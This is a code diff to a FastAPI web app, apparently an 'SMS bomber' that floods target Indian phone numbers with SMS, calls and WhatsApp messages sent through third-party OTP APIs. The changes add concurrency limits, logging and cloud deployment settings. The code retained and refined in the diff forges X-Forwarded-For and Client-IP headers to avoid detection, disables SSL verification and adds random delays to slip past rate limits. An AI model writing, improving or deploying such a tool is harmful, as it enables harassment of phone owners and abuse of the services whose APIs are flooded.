@@ -1,4 +1,3 @@
-# app.py - Fixed Version With All Problems Solved
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -8,6 +7,7 @@ import aiohttp
 import time
 import random
 import json
+import os
 from typing import List, Dict, Optional
 from pydantic import BaseModel
 import uvicorn
@@ -147,6 +147,7 @@ class BombingSession:
     def __init__(self, phones: List[str]):
         self.phones = phones
         self.running = False
+        self.semaphore = asyncio.Semaphore(10) # Limit concurrent requests to avoid overload
         self.stats = {
             "total_requests": 0,
             "successful_hits": 0,
@@ -159,74 +160,84 @@ class BombingSession:
         }
     
     async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
+        # Standardize phone number to +91XXXXXXXXXX format
+        full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
+        
         while self.running:
             try:
-                # Standardize phone format - add +91 prefix if not present
-                full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
-                name = api["name"]
-                url = api["url"](full_phone) if callable(api["url"]) else api["url"]
-                headers = {k: v for k, v in api["headers"].items()}
-                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                headers["Client-IP"] = headers["X-Forwarded-For"]
-                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-                
-                self.stats["total_requests"] += 1
-                
-                # Update type-specific stats
-                if api["type"] == "call":
-                    self.stats["calls_sent"] += 1
-                    emoji = "📞"
-                    tag = "call"
-                elif api["type"] == "whatsapp":
-                    self.stats["whatsapp_sent"] += 1
-                    emoji = "📱"
-                    tag = "whatsapp"
-                else:
-                    self.stats["sms_sent"] += 1
-                    emoji = "💬"
-                    tag = "sms"
-                
-                success = False
-                if api["method"] == "POST":
-                    data = api["data"](full_phone) if api["data"] else None
-                    async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                else:
-                    async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
-                        if response.status in [200, 201, 202]:
-                            success = True
-                
-                if success:
-                    self.stats["successful_hits"] += 1
-                    message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
-                    print(f"\033[91m{message}\033[0m")
-                else:
-                    self.stats["failed_attempts"] += 1
-                    message = f"⚠️ {api['type'].upper()}: {name} - Failed"
-                
-                # Broadcast to all connected clients
-                await manager.broadcast({
-                    "type": "log",
-                    "tag": "success" if success else "error",
-                    "message": message,
-                    "stats": self.stats,
-                    "phone": full_phone
-                })
-                
-                # 2-5 second random delay to prevent IP blocking
-                await asyncio.sleep(random.uniform(2, 5))
+                async with self.semaphore:
+                    name = api["name"]
+                    # Handle both callable and static URLs
+                    if callable(api["url"]):
+                        url = api["url"](full_phone)
+                    else:
+                        url = api["url"]
+                    
+                    headers = {k: v for k, v in api["headers"].items()}
+                    # Add fake IP and user agent to avoid detection
+                    headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                    headers["Client-IP"] = headers["X-Forwarded-For"]
+                    headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+                    
+                    self.stats["total_requests"] += 1
+                    
+                    # Update type-specific stats
+                    if api["type"] == "call":
+                        self.stats["calls_sent"] += 1
+                        emoji = "📞"
+                        tag = "call"
+                    elif api["type"] == "whatsapp":
+                        self.stats["whatsapp_sent"] += 1
+                        emoji = "📱"
+                        tag = "whatsapp"
+                    else:
+                        self.stats["sms_sent"] += 1
+                        emoji = "💬"
+                        tag = "sms"
+                    
+                    success = False
+                    if api["method"] == "POST":
+                        data = api["data"](full_phone) if api["data"] else None
+                        async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
+                            if response.status in [200, 201, 202]:
+                                success = True
+                    else:
+                        async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
+                            if response.status in [200, 201, 202]:
+                                success = True
+                    
+                    if success:
+                        self.stats["successful_hits"] += 1
+                        message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
+                        print(f"\033[92m{message}\033[0m")
+                    else:
+                        self.stats["failed_attempts"] += 1
+                        message = f"⚠️ {api['type'].upper()}: {name} - Failed (Status: {response.status if 'response' in locals() else 'No Response'})"
+                        print(f"\033[91m{message}\033[0m")
+                    
+                    # Broadcast to all connected clients
+                    await manager.broadcast({
+                        "type": "log",
+                        "tag": "success" if success else "error",
+                        "message": message,
+                        "stats": self.stats,
+                        "phone": full_phone
+                    })
+                    
+                    # Random delay between 2-5 seconds to avoid rate limits
+                    await asyncio.sleep(random.uniform(2, 5))
             
             except Exception as e:
                 self.stats["failed_attempts"] += 1
-                # Detailed error logging for debugging
-                print(f"❌ Failed to hit {name}: {str(e)}")
+                print(f"\033[91m❌ Failed to hit {api['name']}: {str(e)}\033[0m")
+                await asyncio.sleep(5) # Wait longer on error
                 continue
     
     async def start(self):
         self.running = True
         self.stats["start_time"] = time.time()
         
+        # Create aiohttp session with relaxed SSL settings
         connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
             tasks = []
@@ -261,7 +272,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 if not phones:
                     await manager.broadcast({
                         "type": "error",
-                        "message": "❌ Invalid phone numbers provided"
+                        "message": "❌ Invalid phone numbers provided (must be 10 digits)"
                     })
                     continue
                 
@@ -321,4 +332,6 @@ async def websocket_endpoint(websocket: WebSocket):
         manager.disconnect(websocket)
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    # Use Railway's PORT env variable, fallback to 8000 for local testing
+    port = int(os.getenv("PORT", 8000))
+    uvicorn.run(app, host="0.0.0.0", port=port)
